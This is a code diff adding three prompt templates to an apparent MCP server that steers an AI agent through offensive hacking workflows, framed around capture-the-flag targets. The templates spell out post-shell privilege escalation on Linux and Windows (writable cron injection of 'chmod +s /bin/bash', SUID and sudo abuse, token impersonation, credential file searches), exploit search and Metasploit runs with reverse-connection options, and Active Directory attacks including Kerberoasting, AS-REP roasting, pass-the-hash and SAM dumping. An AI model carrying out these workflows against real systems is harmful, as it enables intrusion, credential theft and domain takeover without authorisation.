@@ -298,3 +298,223 @@ STEP 4 — REPORT
 
 Stop immediately if you detect an account lockout policy being triggered.
 """
+
+    # -----------------------------------------------------------------------
+    # Post-exploitation  [PRIORITY 6 — decision tree for post-shell phase]
+    # -----------------------------------------------------------------------
+    @mcp.prompt(name="post_exploitation")
+    def prompt_post_exploitation(
+        host: str,
+        username: str,
+        password: str = "",
+        key_file: str = "",
+        os_type: str = "linux"
+    ) -> str:
+        """
+        Post-exploitation and privilege escalation workflow.
+
+        WHEN TO USE: Immediately after getting a shell on a target.
+        Covers shell stabilisation, automated enum, manual checks, and escalation.
+
+        Args:
+            host:     Compromised host IP
+            username: Current user on the target
+            password: SSH password (if available)
+            key_file: Path to SSH key on Kali (if available)
+            os_type:  "linux" or "windows"
+        """
+        auth = f"password='{password}'" if password else f"key_file='{key_file}'"
+
+        if os_type.lower() == "windows":
+            return f"""
+You have a shell on a Windows target at {host} as user: {username}
+
+Follow this post-exploitation methodology strictly:
+
+STEP 1 — SITUATIONAL AWARENESS
+  • ssh_command(host="{host}", username="{username}", {auth},
+               command="whoami /all && net user && systeminfo | findstr /B /C:'OS' /C:'Domain'")
+  • Note: current privileges, group memberships, OS version, domain membership
+
+STEP 2 — AUTOMATED PRIVESC ENUM
+  • run_linpeas(host="{host}", username="{username}", {auth}, script_type="winpeas")
+  • Read the output carefully — focus on red/yellow highlighted findings
+
+STEP 3 — TOKEN PRIVILEGES (most common CTF vector)
+  • ssh_command(..., command="whoami /priv")
+  • If SeImpersonatePrivilege is Enabled → use PrintSpoofer or GodPotato
+  • searchsploit("PrintSpoofer") or searchsploit("GodPotato") for the right binary
+
+STEP 4 — SERVICE MISCONFIGURATIONS
+  • ssh_command(..., command="sc qc <suspicious_service>")
+  • Look for services with writable binaries or unquoted paths
+  • ssh_command(..., command="wmic service get name,pathname | findstr /i /v C:\\\\Windows")
+
+STEP 5 — STORED CREDENTIALS
+  • ssh_command(..., command="cmdkey /list")
+  • ssh_command(..., command="dir /s /b *pass* *cred* *.config 2>nul")
+
+STEP 6 — ESCALATE & GET FLAGS
+  • Once SYSTEM: ssh_command(..., command="type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt")
+  • Also check: ssh_command(..., command="type C:\\\\Users\\\\{username}\\\\Desktop\\\\user.txt")
+
+STEP 7 — LATERAL MOVEMENT (if domain-joined)
+  • crackmapexec(target="<domain_range>", username="{username}", password="<found_pass>")
+  • If NT hash available: crackmapexec(..., hash_value="<ntlm_hash>", additional_args="--shares")
+"""
+        else:
+            return f"""
+You have a shell on a Linux target at {host} as user: {username}
+
+Follow this post-exploitation methodology strictly:
+
+STEP 1 — SITUATIONAL AWARENESS
+  • ssh_command(host="{host}", username="{username}", {auth},
+               command="id && whoami && uname -a && cat /etc/passwd | grep sh$")
+  • Note: UID/GID, groups, kernel version, other users with shells
+
+STEP 2 — AUTOMATED PRIVESC ENUM (do this first — it covers most of what follows)
+  • run_linpeas(host="{host}", username="{username}", {auth})
+  • Read carefully — focus on: SUID binaries, sudo permissions, cron jobs, writable paths
+
+STEP 3 — SUDO PERMISSIONS  (most common CTF vector)
+  • ssh_command(..., command="sudo -l")
+  • If ANY binary shows NOPASSWD → check GTFOBins immediately
+  • Especially: vim, python, perl, find, nmap, less, awk, bash, cp, mv
+
+STEP 4 — SUID BINARIES
+  • ssh_command(..., command="find / -perm -4000 -type f 2>/dev/null")
+  • Cross-check every result against GTFOBins: https://gtfobins.github.io
+
+STEP 5 — CRON JOBS
+  • ssh_command(..., command="cat /etc/crontab && ls -la /etc/cron*")
+  • If a cron script is writable: echo 'chmod +s /bin/bash' >> <script>
+  • Wait for cron, then: bash -p
+
+STEP 6 — KERNEL EXPLOITS (last resort)
+  • ssh_command(..., command="uname -r")
+  • searchsploit(query="Linux Kernel <version>")
+  • Only use kernel exploits if all other vectors fail — they can crash the machine
+
+STEP 7 — GET FLAGS
+  • User flag:  ssh_command(..., command="find / -name user.txt 2>/dev/null | xargs cat")
+  • Root flag:  ssh_command(..., command="find / -name root.txt 2>/dev/null | xargs cat")
+
+Explain your reasoning at each step. If linpeas output is long, focus on the
+sections highlighted in red first, then yellow.
+"""
+
+    # -----------------------------------------------------------------------
+    # Exploit search workflow
+    # -----------------------------------------------------------------------
+    @mcp.prompt(name="exploit_search")
+    def prompt_exploit_search(service: str, version: str) -> str:
+        """
+        Find and validate an exploit for a specific service and version.
+
+        WHEN TO USE: After nmap identifies a service version and you need
+        to find a working exploit for it.
+
+        Args:
+            service: Service name e.g. "vsftpd", "Apache", "OpenSSH", "Samba"
+            version: Version string e.g. "2.3.4", "2.4.49", "7.6p1"
+        """
+        return f"""
+You are searching for an exploit targeting: {service} {version}
+
+Follow this workflow in order:
+
+STEP 1 — OFFLINE EXPLOIT DATABASE SEARCH
+  • searchsploit(query="{service} {version}")
+  • Also try: searchsploit(query="{service}")  (broader — catches nearby versions)
+  • Note the EDB-ID and module path of any promising results
+
+STEP 2 — METASPLOIT MODULE CHECK
+  • If searchsploit returns a Metasploit module path:
+    metasploit_run(module="<path>", options={{"RHOSTS": "<target>"}})
+  • Search for the module: execute_command("msfconsole -q -x 'search {service}; exit'")
+
+STEP 3 — EVALUATE RESULTS
+  For each exploit found, assess:
+  - Remote vs local (remote = more valuable for initial access)
+  - Authenticated vs unauthenticated (unauth = better)
+  - Reliability (check the Rank in msf — Excellent > Great > Good > Normal)
+  - CVE number (note for reporting)
+
+STEP 4 — EXPLOITATION
+  • If a reliable Metasploit module exists:
+    metasploit_run(module="<path>", options={{"RHOSTS": "<target>", "LHOST": "<your_ip>", "LPORT": 4444}})
+  • If a standalone script:
+    execute_command("python3 <exploit_path> <target>")
+
+STEP 5 — POST-EXPLOITATION (if exploit succeeds)
+  • Use the post_exploitation prompt to continue
+  • Or: ssh_command to run specific commands on the target
+
+Report the CVE, exploit used, and whether it was authenticated or unauthenticated.
+"""
+
+    # -----------------------------------------------------------------------
+    # Active Directory
+    # -----------------------------------------------------------------------
+    @mcp.prompt(name="active_directory")
+    def prompt_active_directory(dc_ip: str, domain: str, username: str = "", password: str = "") -> str:
+        """
+        Active Directory enumeration and attack workflow.
+
+        WHEN TO USE: When you're on a domain-joined network or have initial
+        AD credentials and want to escalate privileges or move laterally.
+
+        Args:
+            dc_ip:    Domain Controller IP
+            domain:   AD domain name e.g. "corp.local"
+            username: Initial AD username (leave empty for unauthenticated)
+            password: Initial AD password
+        """
+        creds = f"{username}:{password}@{domain}" if username else f"(unauthenticated) @{domain}"
+
+        return f"""
+You are attacking Active Directory.
+
+Domain Controller: {dc_ip}
+Domain:            {domain}
+Credentials:       {creds}
+
+PHASE 1 — INITIAL ENUMERATION
+  {"• crackmapexec(target='" + dc_ip + "', protocol='smb', username='" + username + "', password='" + password + "')" if username else "• crackmapexec(target='" + dc_ip + "', protocol='smb')  — null session check"}
+  • enum4linux_scan(target="{dc_ip}")
+  • Note: domain users, groups, shares, password policy
+
+PHASE 2 — SMB SHARE ENUMERATION
+  • crackmapexec(target="{dc_ip}", username="{username}", password="{password}",
+                additional_args="--shares")
+  • For each readable share: smbclient_interact(target="{dc_ip}", share="<name>",
+                             username="{username}", password="{password}")
+  • Look for: scripts, configs, password files, GPOs
+
+PHASE 3 — KERBEROASTING (if authenticated)
+  • execute_command("GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -outputfile /tmp/spns.txt")
+  • hashcat_crack(hash_file="/tmp/spns.txt", hash_type="13100")  — crack TGS tickets
+
+PHASE 4 — AS-REP ROASTING (accounts with no pre-auth)
+  • execute_command("GetNPUsers.py {domain}/ -dc-ip {dc_ip} -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
+  • hashcat_crack(hash_file="/tmp/asrep.txt", hash_type="18200")
+
+PHASE 5 — PASS-THE-HASH / LATERAL MOVEMENT
+  • If you have an NTLM hash:
+    crackmapexec(target="<range>", username="<user>", hash_value="<ntlm>",
+                additional_args="-x 'whoami'")
+  • Check which hosts you're local admin on (look for Pwn3d! in output)
+
+PHASE 6 — ESCALATE TO DOMAIN ADMIN
+  • If local admin on any host: dump SAM/LSA → find DA creds
+    crackmapexec(target="<host>", username, password/hash, additional_args="--sam")
+  • Check BloodHound paths: execute_command("bloodhound-python -u {username} -p {password} -d {domain} -dc {dc_ip} -c all")
+
+PHASE 7 — FLAGS
+  • DC flags are usually at: \\\\{dc_ip}\\C$\\Users\\Administrator\\Desktop\\root.txt
+    smbclient_interact(target="{dc_ip}", share="C$", username="Administrator",
+                      smb_command="get Users/Administrator/Desktop/root.txt /tmp/root.txt")
+
+Report every user and hash found. Document the full attack chain.
+"""
